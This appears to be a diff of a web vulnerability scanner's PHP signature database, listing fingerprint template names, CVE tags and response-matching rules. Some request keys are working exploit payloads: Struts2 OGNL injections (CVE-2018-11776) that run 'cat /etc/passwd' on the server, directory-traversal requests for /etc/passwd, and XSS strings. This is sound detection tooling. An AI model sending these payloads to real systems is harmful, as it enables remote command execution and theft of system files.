+        1336 => 'rhymix-cms-detect',
+        1337 => 'riello-netman204-panel',
+        1338 => 'roadiz-cms-detect',
+        1339 => 'rocketchat-panel',
+        1340 => 'rocketmq-console-exposure',
+        1341 => 'rockwell-factorytalk-viewpoint-panel',
+        1342 => 'rosariosis-detect',
+        1343 => 'routeros-login',
+        1344 => 'roxy-fileman',
+        1345 => 'rseenet-detect',
+        1346 => 'rustici-content-controller',
+        1347 => 'safeq-panel',
+        1348 => 'saltbo-zpan-panel',
+        1349 => 'saltgui-panel',
+        1350 => 'samba-swat-panel',
+        1351 => 'sangfor-iam-panel',
+        1352 => 'sangfor-ngaf-panel',
+        1353 => 'sanity-studio-panel',
+        1354 => 'sap-netweaver-detect',
+        1355 => 'sauter-login',
+        1356 => 'scadabr-panel',
+        1357 => 'scalar-detection',
+        1358 => 'schneider-tac-vista-panel',
+        1359 => 'scribble-diffusion-panel',
+        1360 => 'seagate-nas-login',
+        1361 => 'searxng-detect',
+        1362 => 'securepoint-utm',
+        1363 => 'security-onion-panel',
+        1364 => 'securityspy-detect',
+        1365 => 'seized-site',
+        1366 => 'sekolahku-cms-detect',
+        1367 => 'sel-rtac-panel',
+        1368 => 'semantic-ui-detect',
+        1369 => 'sensu-panel',
+        1370 => 'serge-panel',
+        1371 => 'sevone-nms-network-manager',
+        1372 => 'shardingsphere-panel',
+        1373 => 'sharefile-storage-server',
+        1374 => 'shell-box',
+        1375 => 'shibboleth-detect',
+        1376 => 'ship-manager-dnv',
+        1377 => 'shopizer-detect',
+        1378 => 'shoppable-token',
+        1379 => 'signet-explorer-dashboard',
+        1380 => 'sillytavern-panel',
+        1381 => 'silver-peak-edgeconnect-panel',
+        1382 => 'silverstripe-detect',
+        1383 => 'sitecore-default-page',
+        1384 => 'skysea-panel',
+        1385 => 'skyvern-panel',
+        1386 => 'slims-cms-detect',
+        1387 => 'smartstore-detect',
+        1388 => 'smoothwall-firewall-panel',
+        1389 => 'smtp2go-detect',
+        1390 => 'smtp4dev-interface-exposed',
+        1391 => 'snapdrop-detect',
+        1392 => 'sogo-detect',
+        1393 => 'solar-log-panel',
+        1394 => 'solaredge-monitoring-panel',
+        1395 => 'solarwinds-arm-panel',
+        1396 => 'solarwinds-servuftp-detect',
+        1397 => 'solr-panel-exposure',
+        1398 => 'sonarr-dashboard-unauth',
+        1399 => 'sonicwall-analytics-panel',
+        1400 => 'sonicwall-sma-panel',
+        1401 => 'sonicwall-security-login',
+        1402 => 'sophos-web-appliance',
+        1403 => 'spacelogic-cbus-panel',
+        1404 => 'spinnaker-detect',
+        1405 => 'spip-detect',
+        1406 => 'sqlbuddy-panel',
+        1407 => 'squarespace-detect',
+        1408 => 'squidex-panel',
+        1409 => 'squirrelmail-login',
+        1410 => 'stackstorm-web-ui-panel',
+        1411 => 'statamic-detect',
+        1412 => 'stirling-pdf-detect',
+        1413 => 'stirling-pdf-panel',
+        1414 => 'stormshield-network-security-panel',
+        1415 => 'storybook-panel',
+        1416 => 'streamlit-detect',
+        1417 => 'stridercd-panel',
+        1418 => 'structurizr-panel',
+        1419 => 'subrion-cms-detect',
+        1420 => 'sugarcrm-panel',
+        1421 => 'sunbird-dcim-panel',
+        1422 => 'supabase-studio-panel',
+        1423 => 'superadmin-ui-panel',
+        1424 => 'superagi-panel',
+        1425 => 'supermicro-bmc-panel',
+        1426 => 'suprema-biostar-panel',
+        1427 => 'suse-manager-panel',
+        1428 => 'symantec-epm-login',
+        1429 => 'synology-rackstation-login',
+        1430 => 'synology-web-station',
+        1431 => 'synopsys-coverity-panel',
+        1432 => 'tableau-panel',
+        1433 => 'tableau-server-detect',
+        1434 => 'tableau-service-manager',
+        1435 => 'tactical-rmm-panel',
+        1436 => 'tailon-panel',
+        1437 => 'taskingai-panel',
+        1438 => 'tautulli-panel',
+        1439 => 'teampass-panel',
+        1440 => 'tectuus-scada-monitor',
+        1441 => 'tenable-sc-panel',
+        1442 => 'tensorboard-panel',
+        1443 => 'terramaster-login',
+        1444 => 'thegreenbowvpn-panel',
+        1445 => 'thinfinity-virtualui-panel',
+        1446 => 'thruk-panel',
+        1447 => 'tibco-businessconnect-detect',
+        1448 => 'tibco-businessworks-detect',
+        1449 => 'tibco-spotfire-panel',
+        1450 => 'tibco-spotfire-services-detect',
+        1451 => 'tigase-xmpp-server',
+        1452 => 'tiny-rss-panel',
+        1453 => 'tinyproxy-detect',
+        1454 => 'tlr-2005ksh-login',
+        1455 => 'tooljet-panel',
+        1456 => 'topaccess-panel',
+        1457 => 'topdesk-detect',
+        1458 => 'torrent-magnet-detect',
+        1459 => 'trend-micro-deep-security-panel',
+        1460 => 'trendnet-tew827dru-login',
+        1461 => 'trust-center-detect',
+        1462 => 'tufin-securetrack-login',
+        1463 => 'turnkey-lamp-panel',
+        1464 => 'typebot-panel',
+        1465 => 'typo3-detect',
+        1466 => 'ubiquiti-edgerouter-panel',
+        1467 => 'unifi-securitygateway-panel',
+        1468 => 'ulanzi-clock',
+        1469 => 'unauth-cyber-power-systems',
+        1470 => 'unauth-pact-broker',
+        1471 => 'unauthenticated-airflow-instance',
+        1472 => 'unauthenticated-alert-manager',
+        1473 => 'unauthenticated-mongo-express',
+        1474 => 'unauthorized-printer-hp',
+        1475 => 'unifi-panel',
+        1476 => 'unitronics-plc-panel',
+        1477 => 'untangle-admin-login',
+        1478 => 'urbackup-panel',
+        1479 => 'user-control-panel',
+        1480 => 'usergate-ngfw-admin-panel',
+        1481 => 'utility-service-detect',
+        1482 => 'vaadin-detect',
+        1483 => 'vaultwarden-panel',
+        1484 => 'vbulletin-detect',
+        1485 => 'vectoradmin-panel',
+        1486 => 'veeam-backup-gcp',
+        1487 => 'verba-panel',
+        1488 => 'veriz0wn-osint',
+        1489 => 'verizon-router-panel',
+        1490 => 'versa-analytics-server',
+        1491 => 'versa-flexvnf-panel',
+        1492 => 'vertex-tax-panel',
+        1493 => 'viewpoint-system-status',
+        1494 => 'vinchin-panel',
+        1495 => 'virtua-software-panel',
+        1496 => 'vmware-carbon-black-edr',
+        1497 => 'vmware-horizon-panel',
+        1498 => 'vmware-vcenter-converter-standalone',
+        1499 => 'vtscada-panel',
+        1500 => 'wamp-server-configuration',
+        1501 => 'wamp-xdebug-detect',
+        1502 => 'wd-mycloud-panel',
+        1503 => 'weak-csp-detect',
+        1504 => 'web-viewer-panel',
+        1505 => 'webasyst-installer',
+        1506 => 'webcomco-panel',
+        1507 => 'webmin-panel',
+        1508 => 'webpagetest-panel',
+        1509 => 'websphere-detect',
+        1510 => 'webtrees-install',
+        1511 => 'webuzo-admin-panel',
+        1512 => 'weebly-detect',
+        1513 => 'weights-biases-detect',
+        1514 => 'westermo-router-panel',
+        1515 => 'wg-easy-panel',
+        1516 => 'whatsup-gold-panel',
+        1517 => 'whisparr-dashboard-unauth',
+        1518 => 'whm-login-detect',
+        1519 => 'wiki-js-installer',
+        1520 => 'wildcard-postmessage',
+        1521 => 'wildfly-panel',
+        1522 => 'wildix-collaboration-panel',
+        1523 => 'windmill-panel',
+        1524 => 'wing-ftp-service-detect',
+        1525 => 'winstone-detect',
+        1526 => 'wix-detect',
+        1527 => 'wms-server-detect',
+        1528 => 'wondercms-detect',
+        1529 => 'workerman-websocket-detect',
+        1530 => 'writebook-detect',
+        1531 => 'ws_ftp-server-web-transfer',
+        1532 => 'wsdl-api',
+        1533 => 'wuzhicms-detect',
+        1534 => 'xcp-ng-xo-lite-panel',
+        1535 => 'xeams-admin-console',
+        1536 => 'xfinity-panel',
+        1537 => 'xinference-panel',
+        1538 => 'xphoneconnect-admin-panel',
+        1539 => 'xwiki-detect',
+        1540 => 'yapi-detect',
+        1541 => 'yellowfin-panel',
+        1542 => 'yeswiki-sql',
+        1543 => 'yopass-panel',
+        1544 => 'yourls-detect',
+        1545 => 'zabbix-error',
+        1546 => 'zabbix-server-login',
+        1547 => 'zammad-helpdesk-panel',
+        1548 => 'zap-rest-api-detect',
+        1549 => 'zblogphp-panel',
+        1550 => 'zerof-webserver-detect',
+        1551 => 'zeroshell-login',
+        1552 => 'zimbra-web-login',
+        1553 => 'zipkin-exposure',
+        1554 => 'zk-framework-detect',
+        1555 => 'zoneminder-login',
+        1556 => 'zoneminder-system-log',
+        1557 => 'zope-detect',
+        1558 => 'zywall-usg-panel',
+        1559 => 'zyxel-vsg1432b101-login',
+        1560 => 'openshift-oauth-proxy-panel',
+        1561 => 'CVE-2019-1943',
+        1562 => 'CVE-2021-43574',
+        1563 => 'CVE-2022-47945',
+        1564 => 'CVE-2025-13390',
+        1565 => 'CVE-2026-1207',
+        1566 => 'audiocodes-detect',
+        1567 => 'connectbox-panel',
+        1568 => 'django-variables-exposed',
+        1569 => 'pingaccess-detect',
+        1570 => 'redis-exception-error',
+        1571 => 'salesforce-b2c-commerce-webdav',
+        1572 => 'sap-logon-error-message',
+        1573 => 'tomcat-stacktraces',
+        1574 => 'zyxel-vmg1312b10d-login',
+        1575 => 'CVE-2020-15129',
+        1576 => 'aws-redirect',
+        1577 => 'basic-auth-detect',
+        1578 => 'ccm-detect',
+        1579 => 'codemeter-webadmin-panel',
+        1580 => 'database-error',
+        1581 => 'flask-werkzeug-debug',
+        1582 => 'ixcache-panel',
+        1583 => 'kerion-control-panel',
+        1584 => 'microsoft-azure-error',
+        1585 => 'microsoft-runtime-error',
+        1586 => 'normhost-backup-server-manager',
+        1587 => 'rstudio-detect',
+        1588 => 'softether-vpn-panel',
+        1589 => 'sucuri-firewall',
+        1590 => 'symfony-conflicting-misconfig',
+        1591 => 'twig-runtime-error',
+        1592 => 'windows-admin-center-panel',
+        1593 => 'wordpress-user-enum',
+        1594 => 'yii-error-page',
+        1595 => 'switch-protocol',
+        1596 => 'route-nextjs',
       ),
       'b' => 
       array (
@@ -86977,6 +87631,69 @@ return array (
           's' => 200,
           'bw' => 
           array (
+            0 => 'instawp-wrap',
+            1 => 'user_pass</th>',
+            2 => 'user_email</th>',
+            3 => '<script>alert(document.domain)</script>',
+            4 => 'websys/webArch/mainFrame.cgi',
+            5 => 'Web Image Monitor',
+            6 => 'YesWiki',
+            7 => 'src="https://js.stripe.com/v3/"',
+            8 => 'let rf = \'//oast.pro',
+            9 => 'window.location.href = rf;',
+            10 => 'var igd',
+            11 => 'Upload form for file "><svg/onload=alert(document.domain)>',
+            12 => '<script src="http://interact.sh/',
+            13 => 'Heimdall',
+          ),
+          'hw' => 
+          array (
+            0 => 'text/html',
+            1 => 'YesWiki-main',
+            2 => 'text/plain',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => '"clientSecret":"a"',
+            1 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'cve2025',
+          'sev' => 'high',
+          'sig' => 1,
+          't' => 
+          array (
+            0 => 'CVE-2025-2636',
+            1 => 'CVE-2025-41393',
+            2 => 'CVE-2025-46549',
+            3 => 'CVE-2025-68602',
+            4 => 'CVE-2025-12139',
+            5 => 'CVE-2025-31131',
+            6 => 'CVE-2025-4078',
+            7 => 'CVE-2025-46349',
+            8 => 'CVE-2025-50578',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'text/html',
+              1 => 'text/plain',
+            ),
+          ),
+          'w' => 8,
+        ),
+        8 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
             0 => 'Config Editor',
             1 => 'Current Config',
             2 => 'Update Config',
@@ -87017,7 +87734,7 @@ return array (
           ),
           'w' => 8,
         ),
-        8 => 
+        9 => 
         array (
           's' => 200,
           'bw' => 
@@ -87118,7 +87835,7 @@ return array (
           ),
           'w' => 2,
         ),
-        9 => 
+        10 => 
         array (
           's' => 200,
           'bw' => 
@@ -87162,7 +87879,7 @@ return array (
           ),
           'w' => 8,
         ),
-        10 => 
+        11 => 
         array (
           's' => 200,
           'bw' => 
@@ -87210,63 +87927,6 @@ return array (
           array (
             0 => 'x-goog-metageneration',
             1 => 'x-goog-generation',
-          ),
-          'w' => 8,
-        ),
-        11 => 
-        array (
-          's' => 200,
-          'bw' => 
-          array (
-            0 => 'instawp-wrap',
-            1 => 'user_pass</th>',
-            2 => 'user_email</th>',
-            3 => '<script>alert(document.domain)</script>',
-            4 => 'websys/webArch/mainFrame.cgi',
-            5 => 'Web Image Monitor',
-            6 => 'YesWiki',
-            7 => 'src="https://js.stripe.com/v3/"',
-            8 => 'let rf = \'//oast.pro',
-            9 => 'window.location.href = rf;',
-            10 => 'Upload form for file "><svg/onload=alert(document.domain)>',
-            11 => '<script src="http://interact.sh/',
-            12 => 'Heimdall',
-          ),
-          'hw' => 
-          array (
-            0 => 'text/html',
-            1 => 'YesWiki-main',
-          ),
-          'nf' => 
-          array (
-          ),
-          'sz' => NULL,
-          'rx' => 
-          array (
-            0 => 'root:a:0:0:',
-          ),
-          'h' => 
-          array (
-          ),
-          'pid' => 'cve2025',
-          'sev' => 'high',
-          'sig' => 1,
-          't' => 
-          array (
-            0 => 'CVE-2025-2636',
-            1 => 'CVE-2025-41393',
-            2 => 'CVE-2025-46549',
-            3 => 'CVE-2025-68602',
-            4 => 'CVE-2025-31131',
-            5 => 'CVE-2025-46349',
-            6 => 'CVE-2025-50578',
-          ),
-          'th' => 
-          array (
-            'Content-Type' => 
-            array (
-              0 => 'text/html',
-            ),
           ),
           'w' => 8,
         ),
@@ -88438,6 +89098,108 @@ return array (
         ),
       ),
     ),
+    'GET /%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'struts',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2018-11776',
+          ),
+        ),
+      ),
+    ),
+    'GET /%24%7B%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/help.action' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'struts',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2018-11776',
+          ),
+        ),
+      ),
+    ),
+    'GET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'struts',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2018-11776',
+          ),
+        ),
+      ),
+    ),
     'GET /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd' => 
     array (
       'b' => 
@@ -88468,6 +89230,41 @@ return array (
           't' => 
           array (
             0 => 'CVE-2021-46104',
+          ),
+        ),
+      ),
+    ),
+    'GET /%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'application/octet-stream',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'nexus',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2024-4956',
           ),
         ),
       ),
@@ -90339,6 +91136,48 @@ return array (
         ),
       ),
     ),
+    'GET /../../../../../../../../../../../etc/passwd' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'Webp-Server-Go',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'webp',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'webp-server-lfi',
+          ),
+          'th' => 
+          array (
+            'Server' => 
+            array (
+              0 => 'Webp-Server-Go',
+            ),
+          ),
+        ),
+      ),
+    ),
     'GET /../../../../../../../../../../etc/passwd' => 
     array (
       'b' => 
@@ -91684,6 +92523,41 @@ return array (
           't' => 
           array (
             0 => 'config-rb',
+          ),
+        ),
+      ),
+    ),
+    'GET /.circleci/config.yml' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'jobs:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'circleci',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'circleci-config',
           ),
         ),
       ),
@@ -107777,7 +108651,7 @@ return array (
           's' => 200,
           'bw' => 
           array (
-            0 => 'ï¿½ï¿½à¡±ï¿½',
+            0 => 'ÐÏà¡±á',
           ),
           'hw' => 
           array (
@@ -109320,6 +110194,48 @@ return array (
           't' => 
           array (
             0 => 'CVE-2018-11409',
+          ),
+        ),
+      ),
+    ),
+    'GET /__screenshot-error' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'image/png',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'cve2025',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2025-24963',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'image/png',
+            ),
           ),
         ),
       ),
@@ -114480,6 +115396,42 @@ return array (
             array (
               0 => 'text/html',
             ),
+          ),
+        ),
+      ),
+    ),
+    'GET /adama/adama/downloadService' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'application/octet-stream',
+            1 => 'filename=',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'cve2024',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2024-55457',
           ),
         ),
       ),
@@ -123058,6 +124010,48 @@ return array (
           't' => 
           array (
             0 => 'prometheus-metrics',
+          ),
+        ),
+      ),
+    ),
+    'GET /api/model_report/file/download' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'application/octet-stream',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'hcm-cloud',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'hcm-cloud-lfi',
+          ),
+          'th' => 
+          array (
+            'Content-Type' => 
+            array (
+              0 => 'application/octet-stream',
+            ),
           ),
         ),
       ),
@@ -136763,12 +137757,12 @@ return array (
           'h' => 
           array (
           ),
-          'pid' => 'odoo',
-          'sev' => 'medium',
+          'pid' => 'windows',
+          'sev' => 'high',
           'sig' => 0,
           't' => 
           array (
-            0 => 'CVE-2017-9416',
+            0 => 'CVE-2019-14322',
           ),
         ),
         1 => 
@@ -136776,9 +137770,6 @@ return array (
           's' => 200,
           'bw' => 
           array (
-            0 => 'bit app support',
-            1 => 'fonts',
-            2 => 'extensions',
           ),
           'hw' => 
           array (
@@ -136789,16 +137780,17 @@ return array (
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
           ),
-          'pid' => 'windows',
-          'sev' => 'high',
+          'pid' => 'odoo',
+          'sev' => 'medium',
           'sig' => 0,
           't' => 
           array (
-            0 => 'CVE-2019-14322',
+            0 => 'CVE-2017-9416',
           ),
         ),
       ),
@@ -136812,9 +137804,6 @@ return array (
           's' => 200,
           'bw' => 
           array (
-            0 => 'bit app support',
-            1 => 'fonts',
-            2 => 'extensions',
           ),
           'hw' => 
           array (
@@ -136825,6 +137814,7 @@ return array (
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'root:a:0:0:',
           ),
           'h' => 
           array (
@@ -141979,6 +142969,41 @@ return array (
         ),
       ),
     ),
+    'GET /cgi-bin/GetFileContent.cgi' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'TRACKID=',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'nvt-web-server',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2023-23063',
+          ),
+        ),
+      ),
+    ),
     'GET /cgi-bin/GetSrvInfo.exe' => 
     array (
       'b' => 
@@ -142093,9 +143118,7 @@ return array (
           's' => 200,
           'bw' => 
           array (
-            0 => 'inet addr:',
-            1 => 'Mask:',
-            2 => 'Content-type: text/html',
+            0 => 'Content-type: text/html',
           ),
           'hw' => 
           array (
@@ -142106,6 +143129,7 @@ return array (
           'sz' => NULL,
           'rx' => 
           array (
+            0 => 'uid=( gid=(',
           ),
           'h' => 
           array (
@@ -142500,6 +143524,64 @@ return array (
           ),
         ),
         1 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'application/octet-stream',
+            1 => 'filename=',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'tip200',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2020-24285',
+          ),
+        ),
+        2 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'cve2020',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'CVE-2020-13886',
+          ),
+        ),
+        3 => 
         array (
           's' => 200,
           'bw' => 
@@ -151695,6 +152777,42 @@ a</title>',
         ),
       ),
     ),
+    'GET /cpasm4/plugInManController/downPlugs' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+          ),
+          'hw' => 
+          array (
+            0 => 'multipart/form-data',
+            1 => 'fileName=',
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'root:a:0:0:',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'cpas',
+          'sev' => 'high',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'cpas-managment-lfi',
+          ),
+        ),
+      ),
+    ),
     'GET /cpbackup-exclude.conf' => 
     array (
       'b' => 
@@ -157855,6 +158973,270 @@ a</title>',
             0 => 'application/json',
             1 => 'text/html',
           ),
+        ),
+      ),
+    ),
+    'GET /docker-compose-dev.yml' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'devops',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'docker-compose-config',
+          ),
+        ),
+      ),
+    ),
+    'GET /docker-compose.dev.yml' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'devops',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'docker-compose-config',
+          ),
+        ),
+      ),
+    ),
+    'GET /docker-compose.override.yml' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'devops',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'docker-compose-config',
+          ),
+        ),
+      ),
+    ),
+    'GET /docker-compose.prod.yml' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'devops',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'docker-compose-config',
+          ),
+        ),
+      ),
+    ),
+    'GET /docker-compose.production.yml' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'devops',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'docker-compose-config',
+          ),
+        ),
+      ),
+    ),
+    'GET /docker-compose.staging.yml' => 
+    array (
+      'b' => 
+      array (
+        0 => 
+        array (
+          's' => 200,
+          'bw' => 
+          array (
+            0 => 'services:',
+          ),
+          'hw' => 
+          array (
+          ),
+          'nf' => 
+          array (
+          ),
+          'sz' => NULL,
+          'rx' => 
+          array (
+            0 => 'version: ',
+          ),
+          'h' => 
+          array (
+          ),
+          'pid' => 'devops',
+          'sev' => 'medium',
+          'sig' => 0,
+          't' => 
+          array (
+            0 => 'docker-compose-config',
+          ),
+        ),
+      ),
+    ),
+    'GET /docker-compose.yml' => 
